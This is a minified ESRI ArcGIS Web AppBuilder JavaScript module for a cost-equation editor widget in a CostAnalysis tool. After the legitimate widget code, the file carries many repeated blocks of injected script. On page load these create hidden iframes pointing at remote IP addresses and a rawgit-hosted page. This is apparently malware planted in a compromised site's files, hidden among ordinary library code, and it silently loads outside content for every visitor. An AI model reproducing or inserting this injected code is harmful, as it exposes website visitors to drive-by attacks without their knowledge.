// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/cost-equation-editor.html":'\x3cdiv style\x3d"height: 100%; width: 100%"\x3e\r\n  \x3cdiv class\x3d"esriCTContentSection"\x3e\r\n    \x3cdiv class\x3d"esriCTCostEquationTitle"\x3e\r\n      ${nls.workBench.costEquationTitle}\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"costEquationEditorNode"\x3e\r\n      \x3cdiv\x3e\r\n        \x3cdiv\x3e\r\n          \x3cdiv class\x3d"esriCTEditCostEquationLabel esriCTFullWidth esriCTEllipsis"  title\x3d"${nls.workBench.geographyTitle}"\x3e\r\n            ${nls.workBench.geographyTitle}\x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTEditCostEquationInput esriCTFullWidth"\x3e\r\n            \x3cdiv class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/TextBox" disabled\x3dtrue data-dojo-attach-point\x3d"geographyValue"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTEditCostEquationLabel esriCTFullWidth esriCTEllipsis"  title\x3d"${nls.workBench.scenarioTitle}"\x3e\r\n            ${nls.workBench.scenarioTitle}\x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTEditCostEquationInput esriCTFullWidth"\x3e\r\n            \x3cdiv class\x3d"esriCTFullWidth" data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"scenarioValue"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTEditCostEquationLabel esriCTFullWidth esriCTEllipsis" title\x3d"${nls.workBench.newCostEquationTitle}"\x3e\r\n            ${nls.workBench.newCostEquationTitle}\x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTEditCostEquationInput esriCTFullWidth" data-dojo-attach-point\x3d"newCostEquationParent"\x3e\r\n            \x3cdiv class\x3d\x3d"esriCTFullWidth" style\x3d"min-height:70px;" spellcheck\x3d"false" data-dojo-type\x3d"dijit/form/Textarea" data-dojo-attach-point\x3d"newCostEquationValue" required\x3d"true"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n           \x3cdiv class\x3d"esriCTEditCostEquationLabel esriCTFullWidth esriCTEllipsis"  title\x3d"${nls.workBench.defaultCostEquationTitle}"\x3e\r\n            ${nls.workBench.defaultCostEquationTitle}\x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTEditCostEquationInput esriCTFullWidth"\x3e\r\n            \x3cdiv class\x3d\x3d"esriCTFullWidth" style\x3d"min-height:70px;" spellcheck\x3d"false" disabled\x3dtrue  data-dojo-type\x3d"dijit/form/Textarea" data-dojo-attach-point\x3d"defaultCostEquationValue"\x3e\r\n            \x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTFullWidth"\x3e\r\n          \x3cdiv class\x3d"esriCTHint" data-dojo-attach-point\x3d"costEquationHint"\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTPageFooter"\x3e\r\n    \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"okButton"\x3e${nls.common.ok}\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-btn esriCTEllipsis" data-dojo-attach-point\x3d"cancelButton"\x3e${nls.common.cancel}\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./cost-equation-editor.html dojo/_base/lang dojo/_base/array dojo/on dojo/dom-attr dojo/dom-class dijit/form/Textarea dijit/form/TextBox dijit/form/Select".split(" "),function(l,m,n,p,q,g,r,e,t,b){return l([m,n,p],{templateString:q,baseClass:"jimu-widget-cost-analysis-equation-editor",_groupInfo:null,postCreate:function(){this.inherited(arguments);t.set(this.costEquationHint,"innerHTML",this.nls.workBench.costingInfoHintText)},
startup:function(){this.inherited(arguments);this.own(e(this.okButton,"click",g.hitch(this,this._onOkButtonClicked)));this.own(e(this.cancelButton,"click",g.hitch(this,function(){this.emit("onCancelButtonClicked")})));this.own(e(this.newCostEquationValue,"change",g.hitch(this,this._onEquationChange)));this.own(e(this.scenarioValue,"change",g.hitch(this,this._onScenarioChange)))},_onOkButtonClicked:function(){var a;a={};b.contains(this.newCostEquationParent,"esriCTInvalidEquation")?this.appUtils.showMessage(this.nls.workBench.errorInvalidCostEquation):
(a=this.scenarioValue._getSelectedOptionsAttr(),this._groupInfo.scenario!==a.scenario||this._groupInfo.equation.toUpperCase()!==this.newCostEquationValue.get("value").toUpperCase()?(a={templateInfo:{COSTEQUATION:this.newCostEquationValue.get("value"),SCENARIO:a.scenario},groupInfo:this._groupInfo},this.emit("onOkButtonClicked",a)):this.emit("onCancelButtonClicked"))},_onEquationChange:function(){var a=!1,c;c=this.newCostEquationValue.get("value");(a=this.appUtils.validateEquation(c))?(this.newCostEquationValue.set("value",
c),b.remove(this.newCostEquationParent,"esriCTInvalidEquation")):b.add(this.newCostEquationParent,"esriCTInvalidEquation")},_onScenarioChange:function(){var a;a=this.scenarioValue._getSelectedOptionsAttr();this.newCostEquationValue.set("value",this._groupInfo.scenario===a.scenario?this._groupInfo.equation:a.costEquation);this.defaultCostEquationValue.set("value",a.defaultEquation)},setGroupInfo:function(a){var c,f;c=a.region;f=a.scenario;"null"===c&&(c=this.nls.scenarioSelection.noneText);this._groupInfo=
a;this.geographyValue.set("value",c);a=this._getConfiguredCostEquations(a.layerId,a.templateName,a.region,f);this.scenarioValue.set("options",[]);this.scenarioValue.addOption(a)},_getConfiguredCostEquations:function(a,c,f,e){var b,h,k;b=[];h=[];this.config.costingInfoSettings.hasOwnProperty(a)&&(b=this.config.costingInfoSettings[a]);"null"===f&&(f="");r.forEach(b,g.hitch(this,function(a){if(a.geography===f&&a.featureTemplate===c){var b,d;b=d=a.scenario;d||(d=this.nls.scenarioSelection.noneText,b=
"null");d={label:d,value:a.costEquation,costEquation:a.costEquation,defaultEquation:a.costEquation,scenario:b,selected:!1};e===b&&(d.selected=!0,this.newCostEquationValue.set("value",this._groupInfo.equation),this.defaultCostEquationValue.set("value",a.costEquation));h.push(d)}""===a.geography&&""===a.scenario&&a.featureTemplate===c&&(k=a.costEquation)}));0===h.length&&(h.push({label:this.nls.scenarioSelection.noneText,value:this._groupInfo.equation,costEquation:this._groupInfo.equation,defaultEquation:k,
scenario:"null",selected:!0}),this.newCostEquationValue.set("value",this._groupInfo.equation),this.defaultCostEquationValue.set("value",k));return h}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});